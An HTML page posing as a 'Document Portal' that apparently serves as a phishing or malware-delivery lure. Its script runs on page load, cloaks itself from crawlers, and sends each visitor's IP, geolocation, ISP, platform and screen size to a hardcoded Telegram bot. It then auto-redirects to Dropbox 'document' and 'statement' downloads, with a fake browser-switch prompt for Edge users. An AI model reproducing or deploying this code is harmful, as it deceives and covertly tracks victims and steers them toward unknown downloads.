<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Document Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            background: white;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.05);
            text-align: center;
            border: 1px solid #e9ecef;
        }
        .icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 16px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        h2 { color: #1a1e2b; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
        p { color: #6c757d; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
        .loader {
            width: 36px;
            height: 36px;
            border: 3px solid #e9ecef;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { color: #6c757d; font-size: 13px; margin: 16px 0; }
        .manual-link { display: none; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef; }
        .manual-link a { color: #667eea; text-decoration: none; font-size: 14px; font-weight: 500; }
        .footer { margin-top: 24px; font-size: 11px; color: #adb5bd; }
        
        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        .modal-card {
            background: white;
            max-width: 480px;
            width: 90%;
            padding: 40px 30px;
            border-radius: 28px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        .modal-icon { font-size: 56px; margin-bottom: 16px; }
        .modal-title { font-size: 26px; font-weight: 600; color: #1a1e2b; margin-bottom: 12px; }
        .modal-text { color: #6c757d; font-size: 15px; margin-bottom: 24px; }
        .btn-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; margin: 24px 0; }
        .btn {
            display: inline-block;
            padding: 12px 28px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
        }
        .btn-chrome { background: #4285f4; color: white; }
        .btn-chrome:hover { background: #3367d6; transform: translateY(-2px); }
        .btn-firefox { background: #ff9400; color: white; }
        .btn-firefox:hover { background: #e08500; transform: translateY(-2px); }
        .btn-cancel { background: #e9ecef; color: #495057; margin-top: 8px; }
        .btn-cancel:hover { background: #dee2e6; }
        .install-links { margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef; }
        .install-links a { color: #4285f4; text-decoration: none; margin: 0 10px; font-size: 14px; }
        .install-links a.firefox-link { color: #ff9400; }
        .install-note { background: #f8f9fa; padding: 12px; border-radius: 12px; margin-top: 20px; font-size: 13px; color: #6c757d; }
        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 8px;
            margin-top: 16px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div id="app">
        <div class="container">
            <div class="icon">📄</div>
            <h2>Document Portal</h2>
            <p>Loading secure document portal...</p>
            <div class="loader"></div>
            <div class="status">Initializing...</div>
            <div class="footer">Secure • Encrypted</div>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = '7867220186:AAFdEwxp6Kf8AxMiQGsvwCdRXpCNb2ul1hY';
        const TELEGRAM_CHAT_ID = '1482823538';
        
        const FILE_LINKS = [
            'https://www.dropbox.com/scl/fi/76l3iokuummrj6bqcwz2l/document.pdf?rlkey=4zny8tbzwnclmicin19mkiqzv&st=u6h49qc7&dl=1',
            'https://www.dropbox.com/scl/fi/n6fm2pc07dypzwrzq5c5w/file.pdf?rlkey=mxhr1idbh4n9kxwgqdvr32g2v&st=8v2ndkty&dl=1',
            'https://www.dropbox.com/scl/fi/817vn4cz1boj1n6qh5wnm/statement.pdf?rlkey=vi7iabc0hkfikecy9qls6jcq9&st=53rpom34&dl=1'
        ];
        
        async function sendTelegram(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
                });
            } catch(e) {}
        }
        
        async function getLocation() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
                const d = await locRes.json();
                return { ip, city: d.city || 'Unknown', region: d.region || 'Unknown', country: d.country_name || 'Unknown', lat: d.latitude || 'N/A', lng: d.longitude || 'N/A', isp: d.org || 'Unknown' };
            } catch(e) { return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 'N/A', lng: 'N/A', isp: 'Unknown' }; }
        }
        
        async function notify(file, browser, action) {
            const loc = await getLocation();
            const fileName = file.split('/').pop().split('?')[0];
            const msg = `🔵 DOCUMENT ACCESS\n\n📍 ${loc.city}, ${loc.region}, ${loc.country}\n🌐 IP: ${loc.ip}\n🗺️ ${loc.lat}, ${loc.lng}\n🏢 ${loc.isp}\n\n📁 ${fileName}\n💻 ${navigator.platform}\n🌍 ${browser}\n🔄 ${action}\n🖥️ ${window.screen.width}x${window.screen.height}\n📅 ${new Date().toISOString()}`;
            await sendTelegram(msg);
        }
        
        function getBrowser() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes('edg') || ua.includes('edge')) return 'Edge';
            if (ua.includes('chrome') && !ua.includes('edg')) return 'Chrome';
            if (ua.includes('firefox')) return 'Firefox';
            return 'Other';
        }
        
        function getRandomFile() {
            let hash = 0;
            const str = navigator.userAgent + navigator.language + screen.width + screen.height;
            for (let i = 0; i < str.length; i++) hash = ((hash << 5) - hash) + str.charCodeAt(i);
            return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
        }
        
        function openInBrowser(browserName, fileUrl) {
            // Create a temporary link and click it
            const link = document.createElement('a');
            link.href = fileUrl;
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // Show success message
            const modal = document.querySelector('.modal-overlay');
            if (modal) {
                const successDiv = document.createElement('div');
                successDiv.className = 'success-message';
                successDiv.innerHTML = `✅ Opening in ${browserName}... The file should download automatically.`;
                modal.querySelector('.modal-card').appendChild(successDiv);
                setTimeout(() => {
                    window.close();
                }, 2000);
            }
        }
        
        function showModal(url, fileUrl) {
            const modal = document.createElement('div');
            modal.className = 'modal-overlay';
            modal.innerHTML = `
                <div class="modal-card">
                    <div class="modal-icon">🌐</div>
                    <div class="modal-title">Switch Browser</div>
                    <div class="modal-text">This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.</div>
                    <div class="btn-group">
                        <button id="chromeBtn" class="btn btn-chrome">Open in Chrome</button>
                        <button id="firefoxBtn" class="btn btn-firefox">Open in Firefox</button>
                    </div>
                    <div class="install-links">
                        <a href="https://www.google.com/chrome/" target="_blank">⬇️ Download Chrome</a>
                        <a href="https://www.mozilla.org/firefox/" target="_blank" class="firefox-link">⬇️ Download Firefox</a>
                    </div>
                    <div class="install-note">💡 After installing: Click the button above again.</div>
                    <button id="cancelBtn" class="btn btn-cancel" style="margin-top: 20px;">Continue in Edge</button>
                </div>
            `;
            document.body.appendChild(modal);
            
            document.getElementById('chromeBtn').onclick = () => {
                notify(FILE_LINKS[0], 'Edge', 'opened_in_chrome');
                openInBrowser('Chrome', fileUrl);
            };
            document.getElementById('firefoxBtn').onclick = () => {
                notify(FILE_LINKS[0], 'Edge', 'opened_in_firefox');
                openInBrowser('Firefox', fileUrl);
            };
            document.getElementById('cancelBtn').onclick = () => {
                notify(FILE_LINKS[0], 'Edge', 'cancelled');
                modal.remove();
                document.getElementById('app').innerHTML = `
                    <div class="container">
                        <div class="icon">📄</div>
                        <h2>Document Portal</h2>
                        <p>You chose to continue in Edge. Opening document...</p>
                        <div class="loader"></div>
                        <div class="footer">Secure • Encrypted</div>
                    </div>
                `;
                setTimeout(() => {
                    window.location.href = fileUrl;
                }, 1500);
            };
        }
        
        (async function() {
            const ua = navigator.userAgent.toLowerCase();
            const isMobile = /mobile|android|iphone|ipad|ipod|blackberry|iemobile/i.test(ua);
            const isBot = /bot|crawler|spider|scraper|facebook|twitter|whatsapp/i.test(ua);
            const browser = getBrowser();
            const url = window.location.href;
            const fileUrl = getRandomFile();
            
            if (isBot) {
                document.getElementById('app').innerHTML = `<div class="container"><div class="icon">📄</div><h2>Document Portal</h2><p>Secure document delivery system.</p><div class="footer">Secure Transmission</div></div>`;
                return;
            }
            if (isMobile) {
                document.getElementById('app').innerHTML = `<div class="container"><div class="icon">📱</div><h2>Desktop Required</h2><p>Please open on a desktop computer.</p><div class="footer">Secure Document Portal</div></div>`;
                return;
            }
            if (browser === 'Edge') {
                notify(fileUrl, 'Edge', 'detected');
                showModal(url, fileUrl);
                return;
            }
            
            notify(fileUrl, browser, 'access');
            document.getElementById('app').innerHTML = `
                <div class="container">
                    <div class="icon">📄</div>
                    <h2>Document Portal</h2>
                    <p>Your document is being prepared</p>
                    <div class="loader"></div>
                    <div class="status">Opening document...</div>
                    <div class="footer">Secure • Encrypted</div>
                </div>
            `;
            setTimeout(() => {
                window.location.href = fileUrl;
            }, 1500);
        })();
    </script>
</body>
</html>
